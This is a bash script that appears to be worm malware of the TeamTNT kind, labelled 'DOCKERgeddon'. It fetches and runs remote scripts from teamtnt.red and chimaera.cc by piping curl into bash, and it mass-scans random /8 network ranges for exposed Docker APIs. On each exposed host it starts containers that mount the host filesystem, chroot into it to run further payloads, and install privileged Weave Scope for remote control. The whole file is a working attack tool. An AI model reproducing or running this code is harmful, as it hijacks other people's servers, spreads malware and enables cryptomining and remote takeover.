#!/bin/bash

if [ -d "/etc/.../.DOCKERgeddon.lock/" ]; then exit ; fi
mkdir -p /etc/.../.DOCKERgeddon.lock/

# curl -Lk http://teamtnt.red/Kuben/sh/scan.sh | bash

curl -Lk http://teamtnt.red/Kuben/sh/setup.scanner.root.sh | bash


echo "DOCKERgeddon"


pwn(){
prt=$2
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $1 -p$prt --rate=$3 | awk '{print $6}'| zgrab --senders 200 --port $prt --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
for ipaddy in ${!rndstr}
do
echo "$ipaddy:$prt"
docker -H tcp://$ipaddy:$2 run -d --name teamtnt -v /:/mnt alpine chroot /mnt /bin/sh -c "curl -sLk http://teamtnt.red/Kuben/sh/scan.sh | bash;curl -# -Lk http://chimaera.cc/sh/mo.sh | bash;while true; do sleep 9999;done" 
docker -H tcp://$ipaddy:$2 run -d --name=weavescope --privileged --userns=host --net=host --pid=host -v /var/run/docker.sock:/var/run/docker.sock -v /sys/kernel/debug:/sys/kernel/debug -e CHECKPOINT_DISABLE weaveworks/scope:1.13.2 --probe.docker=true launch --service-token=d1m9gbsc5dog38bgcf9w7oz6it1tpk8s
done;
}

#while true; do
if [ -d "/etc/.../kill/" ]; then exit; fi
if [ -d "/var/tmp/.../kill/" ]; then exit; fi

R_NR=$(($RANDOM%255+1)) 
T_RANGE=$R_NR".0.0.0/8"

pwn "$T_RANGE" 2375 50000
pwn "$T_RANGE" 2376 50000
pwn "$T_RANGE" 2377 50000
pwn "$T_RANGE" 4244 50000
pwn "$T_RANGE" 4243 50000
#done

rm -fr /etc/.../.DOCKERgeddon.lock/
